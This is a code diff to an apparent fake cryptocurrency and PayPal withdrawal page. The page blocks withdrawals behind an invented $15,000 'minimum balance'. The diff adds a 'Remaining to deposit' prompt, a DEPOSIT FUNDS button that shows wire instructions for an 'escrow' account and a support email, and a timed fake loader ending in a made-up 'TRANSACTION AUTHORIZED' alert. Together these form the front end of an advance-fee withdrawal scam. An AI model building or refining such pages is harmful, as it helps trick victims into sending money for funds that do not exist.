@@ -156,7 +156,7 @@
             }
         }
 
-        /* ADVANCED LOADING OVERLAY - 9 seconds, high-level design */
+        /* ADVANCED LOADING OVERLAY - 9 SECONDS */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -185,7 +185,6 @@
             background: #f8fafc;
         }
         
-        /* Advanced animated rings */
         .loader-container {
             position: relative;
             width: 120px;
@@ -295,7 +294,7 @@
             50% { opacity: 1; }
         }
         
-        /* Advanced Warning Modal (Professional Page) */
+        /* Warning Modal */
         .warning-modal {
             position: fixed;
             top: 0;
@@ -386,6 +385,27 @@
             padding: 16px;
             margin: 20px 0;
             text-align: center;
+        }
+        
+        .deposit-btn {
+            width: 100%;
+            padding: 14px;
+            border-radius: 40px;
+            font-weight: 800;
+            font-size: 13px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            background: #3b82f6;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+        
+        .deposit-btn:hover {
+            background: #2563eb;
+            transform: scale(1.02);
         }
         
         .acknowledge-btn {
@@ -617,7 +637,7 @@
                         </div>
                     </div>
 
-                    <button type="submit" class="group relative w-full overflow-hidden rounded-2xl bg-blue-600 p-5 font-bold text-white transition-all hover:bg-blue-500 active:scale-[0.99] shadow-2xl shadow-blue-900/20">
+                    <button type="submit" id="authorizeBtn" class="group relative w-full overflow-hidden rounded-2xl bg-blue-600 p-5 font-bold text-white transition-all hover:bg-blue-500 active:scale-[0.99] shadow-2xl shadow-blue-900/20">
                         <div class="relative z-10 flex items-center justify-center gap-3 tracking-widest text-sm">
                             <i class="fas fa-lock"></i>
                             AUTHORIZE TRANSACTION
@@ -638,7 +658,7 @@
         </div>
     </div>
 
-    <!-- Advanced Loading Overlay (9 seconds) -->
+    <!-- Loading Overlay -->
     <div id="loadingOverlay" class="loading-overlay">
         <div class="loader-container">
             <div class="orbit-ring orbit-ring-1"></div>
@@ -657,7 +677,7 @@
         </div>
     </div>
 
-    <!-- Advanced Warning Modal (Professional Page) -->
+    <!-- Warning Modal -->
     <div id="warningModal" class="warning-modal">
         <div class="warning-modal-content">
             <div class="warning-header">
@@ -673,11 +693,17 @@
                     <p class="text-xs opacity-60 mb-2">MINIMUM REQUIRED BALANCE</p>
                     <p class="text-2xl font-bold text-red-500 mono-font">$15,000.00</p>
                     <p class="text-xs opacity-50 mt-2">Current Balance: <span class="mono-font" id="currentBalanceWarning">$14,265.71</span></p>
+                    <p class="text-xs font-bold text-amber-500 mt-3">Remaining to deposit: <span class="mono-font" id="remainingAmount">$734.29</span></p>
                 </div>
-                <p class="text-xs opacity-70 leading-relaxed text-center">
-                    Institutional compliance protocols require a minimum liquidity threshold of <strong>$15,000.00 USD</strong> to process any withdrawal transaction. This ensures adequate collateralization and regulatory adherence.
+                <p class="text-xs opacity-70 leading-relaxed text-center mb-4">
+                    Please deposit the remaining balance to reach the minimum requirement of <strong>$15,000.00</strong> before initiating a withdrawal.
                 </p>
-                <button id="acknowledgeBtn" class="acknowledge-btn mt-6">Acknowledge & Return</button>
+                <button id="depositBtn" class="deposit-btn">
+                    <i class="fas fa-plus-circle mr-2"></i> DEPOSIT FUNDS
+                </button>
+                <button id="acknowledgeBtn" class="acknowledge-btn">
+                    Acknowledge & Return
+                </button>
             </div>
         </div>
     </div>
@@ -695,19 +721,15 @@
             </div>
             <div class="help-section">
                 <h4><i class="fas fa-chart-line mr-2"></i> Minimum Balance Requirement</h4>
-                <p>To process any withdrawal, your account must maintain a minimum total balance of <strong class="text-red-500">$15,000.00 USD</strong>. This institutional liquidity requirement ensures compliance with anti-fraud protocols and secure settlement guarantees.</p>
+                <p>To process any withdrawal, your account must maintain a minimum total balance of <strong class="text-red-500">$15,000.00 USD</strong>.</p>
             </div>
             <div class="help-section">
                 <h4><i class="fas fa-coins mr-2"></i> Withdrawal Structure</h4>
-                <p>• <strong>Network Fee:</strong> Flat rate of $2.50 per transaction.<br>• <strong>Net Payout:</strong> Withdrawal amount minus network fee.<br>• <strong>Minimum Withdrawal:</strong> Must exceed network fee.</p>
+                <p>• Network Fee: $2.50 flat rate<br>• Net Payout = Withdrawal Amount - $2.50</p>
             </div>
             <div class="help-section">
                 <h4><i class="fas fa-link mr-2"></i> Address Requirements</h4>
-                <p><strong>Bitcoin:</strong> Supports Legacy (1...), P2SH (3...), and SegWit (bc1...).<br><strong>PayPal:</strong> Valid email address required.</p>
-            </div>
-            <div class="help-section">
-                <h4><i class="fas fa-lock mr-2"></i> Security Protocol</h4>
-                <p>AES-256 encryption • HSM signing • Multi-signature authorization.</p>
+                <p>Bitcoin: 1..., 3..., or bc1... formats<br>PayPal: Valid email address</p>
             </div>
         </div>
     </div>
@@ -721,8 +743,9 @@
                 minimumRequired: 15000.00
             };
 
+            const remainingToDeposit = state.minimumRequired - state.balance;
+
             const elements = {
-                body: document.body,
                 amount: document.getElementById('withdrawAmount'),
                 net: document.getElementById('netPayout'),
                 max: document.getElementById('maxBtn'),
@@ -740,13 +763,14 @@
                 helpModal: document.getElementById('helpModal'),
                 closeModal: document.getElementById('closeModal'),
                 acknowledgeBtn: document.getElementById('acknowledgeBtn'),
+                depositBtn: document.getElementById('depositBtn'),
                 progressBar: document.getElementById('progressBar'),
-                currentBalanceWarning: document.getElementById('currentBalanceWarning')
+                currentBalanceWarning: document.getElementById('currentBalanceWarning'),
+                remainingAmount: document.getElementById('remainingAmount')
             };
 
-            if (elements.currentBalanceWarning) {
-                elements.currentBalanceWarning.textContent = `$${state.balance.toFixed(2)}`;
-            }
+            if (elements.currentBalanceWarning) elements.currentBalanceWarning.textContent = `$${state.balance.toFixed(2)}`;
+            if (elements.remainingAmount) elements.remainingAmount.textContent = `$${remainingToDeposit.toFixed(2)}`;
 
             function isValidBitcoinAddress(address) {
                 if (!address) return false;
@@ -771,9 +795,7 @@
                 if (icon) icon.className = isValid ? 'fas fa-check-circle text-xs' : 'fas fa-exclamation-triangle text-xs';
             }
 
-            function hideWarning() {
-                elements.addressWarning.style.display = 'none';
-            }
+            function hideWarning() { elements.addressWarning.style.display = 'none'; }
 
             function validateAddress() {
                 const address = elements.address.value;
@@ -808,7 +830,7 @@
             }
 
             function applyTheme(theme) {
-                elements.body.className = theme + '-mode p-4';
+                document.body.className = theme + '-mode p-4';
                 elements.themeIcon.className = theme === 'dark' ? 'fas fa-sun text-yellow-400' : 'fas fa-moon text-blue-600';
                 localStorage.setItem('theme', theme);
             }
@@ -821,6 +843,7 @@
                     if (elements.progressBar) elements.progressBar.style.width = Math.min(progress, 100) + '%';
                     if (progress >= 100) clearInterval(interval);
                 }, 100);
+                return interval;
             }
 
             function hideLoadingOverlay() { elements.loadingOverlay.classList.remove('active'); }
@@ -829,7 +852,7 @@
             function showHelpModal() { elements.helpModal.classList.add('active'); }
             function hideHelpModal() { elements.helpModal.classList.remove('active'); }
 
-            async function handleFinalize(e) {
+            function handleFinalize(e) {
                 e.preventDefault();
                 const val = parseFloat(elements.amount.value);
                 const addr = elements.address.value.trim();
@@ -842,12 +865,28 @@
                 if (isBTC && !isValidBitcoinAddress(addr)) { alert("⚠️ INVALID BITCOIN ADDRESS"); return; }
                 if (!isBTC && !isValidEmail(addr)) { alert("⚠️ INVALID EMAIL ADDRESS"); return; }
 
-                showLoadingOverlay();
+                const progressInterval = showLoadingOverlay();
                 setTimeout(() => {
+                    clearInterval(progressInterval);
                     hideLoadingOverlay();
                     const ref = 'NX-' + Math.random().toString(36).substring(2, 9).toUpperCase();
                     alert(`✅ TRANSACTION AUTHORIZED\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\nNet Settlement: $${(val - state.fee).toFixed(2)}\nREF: ${ref}\nStatus: QUEUED`);
                 }, 9000);
+            }
+
+            function handleDeposit() {
+                alert(
+                    `🏦 INSTITUTIONAL DEPOSIT INSTRUCTIONS\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n` +
+                    `Remaining Required: $${remainingToDeposit.toFixed(2)}\n\n` +
+                    `Please initiate a wire transfer or crypto deposit to:\n\n` +
+                    `Bank: Silvergate Bank (Institutional Custody)\n` +
+                    `Account: NEXUS-882-XPL-ESCROW\n` +
+                    `Reference: MINIMUM_TOPUP_${Math.random().toString(36).substring(2, 8).toUpperCase()}\n\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `For crypto deposits, use the wallet address provided in your dashboard.\n\n` +
+                    `Support: institutional@nexus-secure.io`
+                );
             }
 
             elements.amount.addEventListener('input', calculate);
@@ -859,6 +898,7 @@
             elements.helpBtn.addEventListener('click', showHelpModal);
             elements.closeModal.addEventListener('click', hideHelpModal);
             if (elements.acknowledgeBtn) elements.acknowledgeBtn.addEventListener('click', hideWarningModal);
+            if (elements.depositBtn) elements.depositBtn.addEventListener('click', handleDeposit);
             elements.helpModal.addEventListener('click', (e) => { if (e.target === elements.helpModal) hideHelpModal(); });
             elements.warningModal.addEventListener('click', (e) => { if (e.target === elements.warningModal) hideWarningModal(); });
 
